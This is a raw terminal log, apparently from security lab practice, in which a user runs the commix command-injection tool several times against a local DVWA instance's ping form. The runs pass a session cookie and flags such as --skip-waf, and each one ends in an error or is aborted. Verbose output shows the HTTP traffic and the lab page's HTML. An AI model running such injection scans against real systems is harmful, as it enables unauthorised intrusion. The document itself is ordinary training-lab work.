                                                                  ]Scanning processes... [=============================                                                                                  ]Scanning processes... [==============================                                                                                 ]Scanning processes... [==============================                                                                                 ]Scanning processes... [===============================                                                                                ]Scanning processes... [===============================                                                                                ]Scanning processes... [===============================                                                                                ]Scanning processes... [================================                                                                               ]Scanning processes... [================================                                                                               ]Scanning processes... [=================================                                                                              ]Scanning processes... [=================================                                                                              ]Scanning processes... [=================================                                                                              ]Scanning processes... [==================================                                                                             ]Scanning processes... [==================================                                                                             ]Scanning processes... [===================================                                                                            ]Scanning processes... [===================================                                                                            ]Scanning processes... [===================================                                                                            ]Scanning processes... [====================================                                                                           ]Scanning processes... [====================================                                                                           ]Scanning processes... [=====================================                                                                          ]Scanning processes... [=====================================                                                                          ]Scanning processes... [=====================================                                                                          ]Scanning processes... [======================================                                                                         ]Scanning processes... [======================================                                                                         ]Scanning processes... [======================================                                                                         ]Scanning processes... [=======================================                                                                        ]Scanning processes... [=======================================                                                                        ]Scanning processes... [========================================                                                                       ]Scanning processes... [========================================                                                                       ]Scanning processes... [========================================                                                                       ]Scanning processes... [=========================================                                                                      ]Scanning processes... [=========================================                                                                      ]Scanning processes... [==========================================                                                                     ]Scanning processes... [==========================================                                                                     ]Scanning processes... [==========================================                                                                     ]Scanning processes... [===========================================                                                                    ]Scanning processes... [===========================================                                                                    ]Scanning processes... [============================================                                                                   ]Scanning processes... [============================================                                                                   ]Scanning processes... [============================================                                                                   ]Scanning processes... [=============================================                                                                  ]Scanning processes... [=============================================                                                                  ]Scanning processes... [=============================================                                                                  ]Scanning processes... [==============================================                                                                 ]Scanning processes... [==============================================                                                                 ]Scanning processes... [===============================================                                                                ]Scanning processes... [===============================================                                                                ]Scanning processes... [===============================================                                                                ]Scanning processes... [================================================                                                               ]Scanning processes... [================================================                                                               ]Scanning processes... [=================================================                                                              ]Scanning processes... [=================================================                                                              ]Scanning processes... [=================================================                                                              ]Scanning processes... [==================================================                                                             ]Scanning processes... [==================================================                                                             ]Scanning processes... [===================================================                                                            ]Scanning processes... [===================================================                                                            ]Scanning processes... [===================================================                                                            ]Scanning processes... [====================================================                                                           ]Scanning processes... [====================================================                                                           ]Scanning processes... [====================================================                                                           ]Scanning processes... [=====================================================                                                          ]Scanning processes... [=====================================================                                                          ]Scanning processes... [======================================================                                                         ]Scanning processes... [======================================================                                                         ]Scanning processes... [======================================================                                                         ]Scanning processes... [=======================================================                                                        ]Scanning processes... [=======================================================                                                        ]Scanning processes... [========================================================                                                       ]Scanning processes... [========================================================                                                       ]Scanning processes... [========================================================                                                       ]Scanning processes... [=========================================================                                                      ]Scanning processes... [=========================================================                                                      ]Scanning processes... [==========================================================                                                     ]Scanning processes... [==========================================================                                                     ]Scanning processes... [==========================================================                                                     ]Scanning processes... [===========================================================                                                    ]Scanning processes... [===========================================================                                                    ]Scanning processes... [===========================================================                                                    ]Scanning processes... [============================================================                                                   ]Scanning processes... [============================================================                                                   ]Scanning processes... [=============================================================                                                  ]Scanning processes... [=============================================================                                                  ]Scanning processes... [=============================================================                                                  ]Scanning processes... [==============================================================                                                 ]Scanning processes... [==============================================================                                                 ]Scanning processes... [===============================================================                                                ]Scanning processes... [===============================================================                                                ]Scanning processes... [===============================================================                                                ]Scanning processes... [================================================================                                               ]Scanning processes... [================================================================                                               ]Scanning processes... [=================================================================                                              ]Scanning processes... [=================================================================                                              ]Scanning processes... [=================================================================                                              ]Scanning processes... [==================================================================                                             ]Scanning processes... [==================================================================                                             ]Scanning processes... [==================================================================                                             ]Scanning processes... [===================================================================                                            ]Scanning processes... [===================================================================                                            ]Scanning processes... [====================================================================                                           ]Scanning processes... [====================================================================                                           ]Scanning processes... [====================================================================                                           ]Scanning processes... [=====================================================================                                          ]Scanning processes... [=====================================================================                                          ]Scanning processes... [======================================================================                                         ]Scanning processes... [======================================================================                                         ]Scanning processes... [======================================================================                                         ]Scanning processes... [=======================================================================                                        ]Scanning processes... [=======================================================================                                        ]Scanning processes... [========================================================================                                       ]Scanning processes... [========================================================================                                       ]Scanning processes... [========================================================================                                       ]Scanning processes... [=========================================================================                                      ]Scanning processes... [=========================================================================                                      ]Scanning processes... [==========================================================================                                     ]Scanning processes... [==========================================================================                                     ]Scanning processes... [==========================================================================                                     ]Scanning processes... [===========================================================================                                    ]Scanning processes... [===========================================================================                                    ]Scanning processes... [===========================================================================                                    ]Scanning processes... [============================================================================                                   ]Scanning processes... [============================================================================                                   ]Scanning processes... [=============================================================================                                  ]Scanning processes... [=============================================================================                                  ]Scanning processes... [=============================================================================                                  ]Scanning processes... [==============================================================================                                 ]Scanning processes... [==============================================================================                                 ]Scanning processes... [===============================================================================                                ]Scanning processes... [===============================================================================                                ]Scanning processes... [===============================================================================                                ]Scanning processes... [================================================================================                               ]Scanning processes... [================================================================================                               ]Scanning processes... [=================================================================================                              ]Scanning processes... [=================================================================================                              ]Scanning processes... [=================================================================================                              ]Scanning processes... [==================================================================================                             ]Scanning processes... [==================================================================================                             ]Scanning processes... [==================================================================================                             ]Scanning processes... [===================================================================================                            ]Scanning processes... [===================================================================================                            ]Scanning processes... [====================================================================================                           ]Scanning processes... [====================================================================================                           ]Scanning processes... [====================================================================================                           ]Scanning processes... [=====================================================================================                          ]Scanning processes... [=====================================================================================                          ]Scanning processes... [======================================================================================                         ]Scanning processes... [======================================================================================                         ]Scanning processes... [======================================================================================                         ]Scanning processes... [=======================================================================================                        ]Scanning processes... [=======================================================================================                        ]Scanning processes... [========================================================================================                       ]Scanning processes... [========================================================================================                       ]Scanning processes... [========================================================================================                       ]Scanning processes... [=========================================================================================                      ]Scanning processes... [=========================================================================================                      ]Scanning processes... [=========================================================================================                      ]Scanning processes... [==========================================================================================                     ]Scanning processes... [==========================================================================================                     ]Scanning processes... [===========================================================================================                    ]Scanning processes... [===========================================================================================                    ]Scanning processes... [===========================================================================================                    ]Scanning processes... [============================================================================================                   ]Scanning processes... [============================================================================================                   ]Scanning processes... [=============================================================================================                  ]Scanning processes... [=============================================================================================                  ]Scanning processes... [=============================================================================================                  ]Scanning processes... [==============================================================================================                 ]Scanning processes... [==============================================================================================                 ]Scanning processes... [===============================================================================================                ]Scanning processes... [===============================================================================================                ]Scanning processes... [===============================================================================================                ]Scanning processes... [================================================================================================               ]Scanning processes... [================================================================================================               ]Scanning processes... [================================================================================================               ]Scanning processes... [=================================================================================================              ]Scanning processes... [=================================================================================================              ]Scanning processes... [==================================================================================================             ]Scanning processes... [==================================================================================================             ]Scanning processes... [==================================================================================================             ]Scanning processes... [===================================================================================================            ]Scanning processes... [===================================================================================================            ]Scanning processes... [====================================================================================================           ]Scanning processes... [====================================================================================================           ]Scanning processes... [====================================================================================================           ]Scanning processes... [=====================================================================================================          ]Scanning processes... [=====================================================================================================          ]Scanning processes... [======================================================================================================         ]Scanning processes... [======================================================================================================         ]Scanning processes... [======================================================================================================         ]Scanning processes... [=======================================================================================================        ]Scanning processes... [=======================================================================================================        ]Scanning processes... [=======================================================================================================        ]Scanning processes... [========================================================================================================       ]Scanning processes... [========================================================================================================       ]Scanning processes... [=========================================================================================================      ]Scanning processes... [=========================================================================================================      ]Scanning processes... [=========================================================================================================      ]Scanning processes... [==========================================================================================================     ]Scanning processes... [==========================================================================================================     ]Scanning processes... [===========================================================================================================    ]Scanning processes... [===========================================================================================================    ]Scanning processes... [===========================================================================================================    ]Scanning processes... [============================================================================================================   ]Scanning processes... [============================================================================================================   ]Scanning processes... [=============================================================================================================  ]Scanning processes... [=============================================================================================================  ]Scanning processes... [=============================================================================================================  ]Scanning processes... [============================================================================================================== ]Scanning processes... [============================================================================================================== ]Scanning processes... [===============================================================================================================]Scanning processes...                                                                                                                  
+Scanning processor microcode... [                                                                                                     ]Scanning processor microcode... [==================================================                                                   ]Scanning processor microcode... [=====================================================================================================]Scanning processor microcode...                                                                                                        
+Scanning linux images... [                                                                                                            ]Scanning linux images... [====================================                                                                        ]Scanning linux images... [========================================================================                                    ]Scanning linux images... [============================================================================================================]Scanning linux images...                                                                                                               
+
+Running kernel seems to be up-to-date.
+
+The processor microcode seems to be up-to-date.
+
+No services need to be restarted.
+
+No containers need to be restarted.
+
+No user sessions are running outdated binaries.
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ sudo apt install commix commix  --wizard --cookie="PHPSESSID=70pr2bemn4ueqd39fpg0ujtjuo; security=low"[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[Kpython2.7 /bin/commix -u "http://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit"  --cookie="PHPSESSID=70pr2bemn4ueqd39fpg0ujtjuo; security=low" --all --skip-technique b[Acommix -u "http://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit"  --coo[5P[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ccommix -u "http://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit"  --cookie="PHPSE[10P[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ commix -u "http://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit"  --cookie="PHPSESSID=70pr2bemn4ueqd39fpg0ujtjuo; security=low"
+
+[[1m[33mwarning[0m] [1mPython version 3.8.3 detected. You are advised to use Python version 2.7.x.[0m
+                                      __           
+   ___   ___     ___ ___     ___ ___ /\_\   __  _   
+ /`___\ / __`\ /' __` __`\ /' __` __`\/\ \ /\ \/'\  [1m[4mv3.1-stable[0m
+/\ \__//\ \/\ \/\ \/\ \/\ \/\ \/\ \/\ \ \ \\/>  </  
+\ \____\ \____/\ \_\ \_\ \_\ \_\ \_\ \_\ \_\/\_/\_\ [90m[4mhttps://commixproject.com[0m
+ \/____/\/___/  \/_/\/_/\/_/\/_/\/_/\/_/\/_/\//\/_/ ([91m@commixproject[0m)
+
++--
+[1mAutomated All-in-One OS Command Injection and Exploitation Tool[0m
+Copyright © 2014-2020 Anastasios Stasinopoulos[0m ([91m@ancst[0m)
++--
+
+([1m[31m![0m) Legal disclaimer: Usage of commix for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.
+[0m
+[0m[[32minfo[0m] Resolving hostname 'dvwa.local'.[0m
+[0m[[32minfo[0m] Checking connection to the target URL. [0m[32m          [0m
+[[41mcritical[0m] 13.[0m
+
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ commix -u "http://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit"  --cookie="PHPSESSID=70pr2bemn4ueqd39fpg0ujtjuo; security=low" --all
+
+[[1m[33mwarning[0m] [1mPython version 3.8.3 detected. You are advised to use Python version 2.7.x.[0m
+                                      __           
+   ___   ___     ___ ___     ___ ___ /\_\   __  _   
+ /`___\ / __`\ /' __` __`\ /' __` __`\/\ \ /\ \/'\  [1m[4mv3.1-stable[0m
+/\ \__//\ \/\ \/\ \/\ \/\ \/\ \/\ \/\ \ \ \\/>  </  
+\ \____\ \____/\ \_\ \_\ \_\ \_\ \_\ \_\ \_\/\_/\_\ [90m[4mhttps://commixproject.com[0m
+ \/____/\/___/  \/_/\/_/\/_/\/_/\/_/\/_/\/_/\//\/_/ ([91m@commixproject[0m)
+
++--
+[1mAutomated All-in-One OS Command Injection and Exploitation Tool[0m
+Copyright © 2014-2020 Anastasios Stasinopoulos[0m ([91m@ancst[0m)
++--
+
+([1m[31m![0m) Legal disclaimer: Usage of commix for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.
+[0m
+[0m[[32minfo[0m] Resolving hostname 'dvwa.local'.[0m
+[0m[[32minfo[0m] Checking connection to the target URL. [0m[32m          [0m
+[[41mcritical[0m] 13.[0m
+
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ commix -u "http://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit"  --cookie="PHPSESSID=70pr2bemn4ueqd39fpg0ujtjuo; security=low" --all --skip-waf 
+
+[[1m[33mwarning[0m] [1mPython version 3.8.3 detected. You are advised to use Python version 2.7.x.[0m
+                                      __           
+   ___   ___     ___ ___     ___ ___ /\_\   __  _   
+ /`___\ / __`\ /' __` __`\ /' __` __`\/\ \ /\ \/'\  [1m[4mv3.1-stable[0m
+/\ \__//\ \/\ \/\ \/\ \/\ \/\ \/\ \/\ \ \ \\/>  </  
+\ \____\ \____/\ \_\ \_\ \_\ \_\ \_\ \_\ \_\/\_/\_\ [90m[4mhttps://commixproject.com[0m
+ \/____/\/___/  \/_/\/_/\/_/\/_/\/_/\/_/\/_/\//\/_/ ([91m@commixproject[0m)
+
++--
+[1mAutomated All-in-One OS Command Injection and Exploitation Tool[0m
+Copyright © 2014-2020 Anastasios Stasinopoulos[0m ([91m@ancst[0m)
++--
+
+([1m[31m![0m) Legal disclaimer: Usage of commix for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.
+[0m
+[0m[[32minfo[0m] Resolving hostname 'dvwa.local'.[0m
+[0m[[32minfo[0m] Checking connection to the target URL. [0m^C
+[[31merror[0m] User aborted procedure during the detection phase (Ctrl-C was pressed).[0m
+
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ commix -u "http://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit"  --cookie="PHPSESSID=70pr2bemn4ueqd39fpg0ujtjuo; security=low" --all --skip-waf  -v 4[H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ commix -u "http://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit"  --cookie="PHPSESSID=70pr2bemn4ueqd39fpg0ujtjuo; security=low" --all --skip-waf  -v 4
+
+[[1m[33mwarning[0m] [1mPython version 3.8.3 detected. You are advised to use Python version 2.7.x.[0m
+                                      __           
+   ___   ___     ___ ___     ___ ___ /\_\   __  _   
+ /`___\ / __`\ /' __` __`\ /' __` __`\/\ \ /\ \/'\  [1m[4mv3.1-stable[0m
+/\ \__//\ \/\ \/\ \/\ \/\ \/\ \/\ \/\ \ \ \\/>  </  
+\ \____\ \____/\ \_\ \_\ \_\ \_\ \_\ \_\ \_\/\_/\_\ [90m[4mhttps://commixproject.com[0m
+ \/____/\/___/  \/_/\/_/\/_/\/_/\/_/\/_/\/_/\//\/_/ ([91m@commixproject[0m)
+
++--
+[1mAutomated All-in-One OS Command Injection and Exploitation Tool[0m
+Copyright © 2014-2020 Anastasios Stasinopoulos[0m ([91m@ancst[0m)
++--
+
+([1m[31m![0m) Legal disclaimer: Usage of commix for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.
+[0m
+[0m[[32minfo[0m] Resolving hostname 'dvwa.local'.[0m
+[[44m[37mdebug[0m] Creating HTTP requests opener object.[0m
+[0m[[32minfo[0m] Checking connection to the target URL. [0m
+[0m[[1m[45mtraffic[0m] [1mHTTP request:[0m
+POST /vulnerabilities/exec/ HTTP/1.1[0m
+Accept-Encoding: identity[0m
+Content-Type: application/x-www-form-urlencoded[0m
+Content-Length: 27[0m
+Host: dvwa.local[0m
+User-Agent: commix/v3.1-stable (https://commixproject.com)[0m
+Cookie: PHPSESSID=70pr2bemn4ueqd39fpg0ujtjuo; security=low[0m
+Accept: */*[0m
+Connection: close[0m
+[0m
+[0m
+[0m[[1m[45mtraffic[0m] [1mHTTP response (200):[0m
+Date: Thu, 27 Aug 2020 09:22:40 GMT[0m
+Server: Apache/2.4.43 (Debian)[0m
+Expires: Tue, 23 Jun 2009 12:00:00 GMT[0m
+Cache-Control: no-cache, must-revalidate[0m
+Pragma: no-cache[0m
+Vary: Accept-Encoding[0m
+Content-Length: 4616[0m
+Connection: close[0m
+Content-Type: text/html;charset=utf-8[0m
+URI: http://dvwa.local/vulnerabilities/exec/[0m
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: Command Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li class=""><a href="../../instructions.php">Instructions</a></li>
+<li class=""><a href="../../setup.php">Setup / Reset DB</a></li>
+</ul><ul class="menuBlocks"><li class=""><a href="../../vulnerabilities/brute/">Brute Force</a></li>
+<li class="selected"><a href="../../vulnerabilities/exec/">Command Injection</a></li>
+<li class=""><a href="../../vulnerabilities/csrf/">CSRF</a></li>
+<li class=""><a href="../../vulnerabilities/fi/.?page=include.php">File Inclusion</a></li>
+<li class=""><a href="../../vulnerabilities/upload/">File Upload</a></li>
+<li class=""><a href="../../vulnerabilities/captcha/">Insecure CAPTCHA</a></li>
+<li class=""><a href="../../vulnerabilities/sqli/">SQL Injection</a></li>
+<li class=""><a href="../../vulnerabilities/sqli_blind/">SQL Injection (Blind)</a></li>
+<li class=""><a href="../../vulnerabilities/weak_id/">Weak Session IDs</a></li>
+<li class=""><a href="../../vulnerabilities/xss_d/">XSS (DOM)</a></li>
+<li class=""><a href="../../vulnerabilities/xss_r/">XSS (Reflected)</a></li>
+<li class=""><a href="../../vulnerabilities/xss_s/">XSS (Stored)</a></li>
+<li class=""><a href="../../vulnerabilities/csp/">CSP Bypass</a></li>
+<li class=""><a href="../../vulnerabilities/javascript/">JavaScript</a></li>
+</ul><ul class="menuBlocks"><li class=""><a href="../../security.php">DVWA Security</a></li>
+<li class=""><a href="../../phpinfo.php">PHP Info</a></li>
+<li class=""><a href="../../about.php">About</a></li>
+</ul><ul class="menuBlocks"><li class=""><a href="../../logout.php">Logout</a></li>
+</ul>
+				</div>
+
+			</div>
+
+			<div id="main_body">
+
+				
+<div class="body_padded">
+	<h1>Vulnerability: Command Injection</h1>
+
+	<div class="vulnerable_code_area">
+		<h2>Ping a device</h2>
+
+		<form name="ping" action="#" method="post">
+			<p>
+				Enter an IP address:
+				<input type="text" name="ip" size="30">
+				<input type="submit" name="Submit" value="Submit">
+			</p>
+
+		</form>
+		<pre>PING 10.10.10.3 (10.10.10.3) 56(84) bytes of data.
+64 bytes from 10.10.10.3: icmp_seq=1 ttl=64 time=0.421 ms
+64 bytes from 10.10.10.3: icmp_seq=2 ttl=64 time=0.565 ms
+64 bytes from 10.10.10.3: icmp_seq=3 ttl=64 time=0.614 ms
+64 bytes from 10.10.10.3: icmp_seq=4 ttl=64 time=0.485 ms
+
+--- 10.10.10.3 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 3060ms
+rtt min/avg/max/mdev = 0.421/0.521/0.614/0.073 ms
+</pre>
+	</div>
+
+	<h2>More Information</h2>
+	<ul>
+		<li><a href="http://www.scribd.com/doc/2530476/Php-Endangers-Remote-Code-Execution" target="_blank">http://www.scribd.com/doc/2530476/Php-Endangers-Remote-Code-Execution</a></li>
+		<li><a href="http://www.ss64.com/bash/" target="_blank">http://www.ss64.com/bash/</a></li>
+		<li><a href="http://www.ss64.com/nt/" target="_blank">http://www.ss64.com/nt/</a></li>
+		<li><a href="https://www.owasp.org/index.php/Command_Injection" target="_blank">https://www.owasp.org/index.php/Command_Injection</a></li>
+	</ul>
+</div>
+
+				<br /><br />
+				
+
+			</div>
+
+			<div class="clear">
+			</div>
+
+			<div id="system_info">
+				<input type="button" value="View Help" class="popup_button" id='help_button' data-help-url='../../vulnerabilities/view_help.php?id=exec&security=low' )"> <input type="button" value="View Source" class="popup_button" id='source_button' data-source-url='../../vulnerabilities/view_source.php?id=exec&security=low' )"> <div align="left"><em>Username:</em> admin<br /><em>Security Level:</em> low<br /><em>PHPIDS:</em> disabled</div>
+			</div>
+
+			<div id="footer">
+
+				<p>Damn Vulnerable Web Application (DVWA) v1.10 *Development*</p>
+				<script src='../..//dvwa/js/add_event_listeners.js'></script>
+
+			</div>
+
+		</div>
+
+	</body>
+
+</html>[0m
+[[41mcritical[0m] 13.[0m
+
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ commix -u "http://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit"  --cookie="PHPSESSID=70pr2bemn4ueqd39fpg0ujtjuo; security=low" --all --skip-waf  -v 4 -p ip
+
+[[1m[33mwarning[0m] [1mPython version 3.8.3 detected. You are advised to use Python version 2.7.x.[0m
+                                      __           
+   ___   ___     ___ ___     ___ ___ /\_\   __  _   
+ /`___\ / __`\ /' __` __`\ /' __` __`\/\ \ /\ \/'\  [1m[4mv3.1-stable[0m
+/\ \__//\ \/\ \/\ \/\ \/\ \/\ \/\ \/\ \ \ \\/>  </  
+\ \____\ \____/\ \_\ \_\ \_\ \_\ \_\ \_\ \_\/\_/\_\ [90m[4mhttps://commixproject.com[0m
+ \/____/\/___/  \/_/\/_/\/_/\/_/\/_/\/_/\/_/\//\/_/ ([91m@commixproject[0m)
+
++--
+[1mAutomated All-in-One OS Command Injection and Exploitation Tool[0m
+Copyright © 2014-2020 Anastasios Stasinopoulos[0m ([91m@ancst[0m)
++--
+
+([1m[31m![0m) Legal disclaimer: Usage of commix for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.
+[0m
+[0m[[32minfo[0m] Resolving hostname 'dvwa.local'.[0m
+[[44m[37mdebug[0m] Creating HTTP requests opener object.[0m
+[0m[[32minfo[0m] Checking connection to the target URL. [0m
+[0m[[1m[45mtraffic[0m] [1mHTTP request:[0m
+POST /vulnerabilities/exec/ HTTP/1.1[0m
+Accept-Encoding: identity[0m
+Content-Type: application/x-www-form-urlencoded[0m
+Content-Length: 27[0m
+Host: dvwa.local[0m
+User-Agent: commix/v3.1-stable (https://commixproject.com)[0m
+Cookie: PHPSESSID=70pr2bemn4ueqd39fpg0ujtjuo; security=low[0m
+Accept: */*[0m
+Connection: close[0m
+[0m
+[0m
+[0m[[1m[45mtraffic[0m] [1mHTTP response (200):[0m
+Date: Thu, 27 Aug 2020 09:26:26 GMT[0m
+Server: Apache/2.4.43 (Debian)[0m
+Expires: Tue, 23 Jun 2009 12:00:00 GMT[0m
+Cache-Control: no-cache, must-revalidate[0m
+Pragma: no-cache[0m
+Vary: Accept-Encoding[0m
+Content-Length: 4616[0m
+Connection: close[0m
+Content-Type: text/html;charset=utf-8[0m
+URI: http://dvwa.local/vulnerabilities/exec/[0m
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: Command Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li class=""><a href="../../instructions.php">Instructions</a></li>
+<li class=""><a href="../../setup.php">Setup / Reset DB</a></li>
+</ul><ul class="menuBlocks"><li class=""><a href="../../vulnerabilities/brute/">Brute Force</a></li>
+<li class="selected"><a href="../../vulnerabilities/exec/">Command Injection</a></li>
+<li class=""><a href="../../vulnerabilities/csrf/">CSRF</a></li>
+<li class=""><a href="../../vulnerabilities/fi/.?page=include.php">File Inclusion</a></li>
+<li class=""><a href="../../vulnerabilities/upload/">File Upload</a></li>
+<li class=""><a href="../../vulnerabilities/captcha/">Insecure CAPTCHA</a></li>
+<li class=""><a href="../../vulnerabilities/sqli/">SQL Injection</a></li>
+<li class=""><a href="../../vulnerabilities/sqli_blind/">SQL Injection (Blind)</a></li>
+<li class=""><a href="../../vulnerabilities/weak_id/">Weak Session IDs</a></li>
+<li class=""><a href="../../vulnerabilities/xss_d/">XSS (DOM)</a></li>
+<li class=""><a href="../../vulnerabilities/xss_r/">XSS (Reflected)</a></li>
+<li class=""><a href="../../vulnerabilities/xss_s/">XSS (Stored)</a></li>
+<li class=""><a href="../../vulnerabilities/csp/">CSP Bypass</a></li>
+<li class=""><a href="../../vulnerabilities/javascript/">JavaScript</a></li>
+</ul><ul class="menuBlocks"><li class=""><a href="../../security.php">DVWA Security</a></li>
+<li class=""><a href="../../phpinfo.php">PHP Info</a></li>
+<li class=""><a href="../../about.php">About</a></li>
+</ul><ul class="menuBlocks"><li class=""><a href="../../logout.php">Logout</a></li>
+</ul>
+				</div>
+
+			</div>
+
+			<div id="main_body">
+
+				
+<div class="body_padded">
+	<h1>Vulnerability: Command Injection</h1>
+
+	<div class="vulnerable_code_area">
+		<h2>Ping a device</h2>
+
+		<form name="ping" action="#" method="post">
+			<p>
+				Enter an IP address:
+				<input type="text" name="ip" size="30">
+				<input type="submit" name="Submit" value="Submit">
+			</p>
+
+		</form>
+		<pre>PING 10.10.10.3 (10.10.10.3) 56(84) bytes of data.
+64 bytes from 10.10.10.3: icmp_seq=1 ttl=64 time=0.378 ms
+64 bytes from 10.10.10.3: icmp_seq=2 ttl=64 time=0.578 ms
+64 bytes from 10.10.10.3: icmp_seq=3 ttl=64 time=0.573 ms
+64 bytes from 10.10.10.3: icmp_seq=4 ttl=64 time=0.571 ms
+
+--- 10.10.10.3 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 3059ms
+rtt min/avg/max/mdev = 0.378/0.525/0.578/0.084 ms
+</pre>
+	</div>
+
+	<h2>More Information</h2>
+	<ul>
+		<li><a href="http://www.scribd.com/doc/2530476/Php-Endangers-Remote-Code-Execution" target="_blank">http://www.scribd.com/doc/2530476/Php-Endangers-Remote-Code-Execution</a></li>
+		<li><a href="http://www.ss64.com/bash/" target="_blank">http://www.ss64.com/bash/</a></li>
+		<li><a href="http://www.ss64.com/nt/" target="_blank">http://www.ss64.com/nt/</a></li>
+		<li><a href="https://www.owasp.org/index.php/Command_Injection" target="_blank">https://www.owasp.org/index.php/Command_Injection</a></li>
+	</ul>
+</div>
+
+				<br /><br />
+				
+
+			</div>
+
+			<div class="clear">
+			</div>
+
+			<div id="system_info">
+				<input type="button" value="View Help" class="popup_button" id='help_button' data-help-url='../../vulnerabilities/view_help.php?id=exec&security=low' )"> <input type="button" value="View Source" class="popup_button" id='source_button' data-source-url='../../vulnerabilities/view_source.php?id=exec&security=low' )"> <div align="left"><em>Username:</em> admin<br /><em>Security Level:</em> low<br /><em>PHPIDS:</em> disabled</div>
+			</div>
+
+			<div id="footer">
+
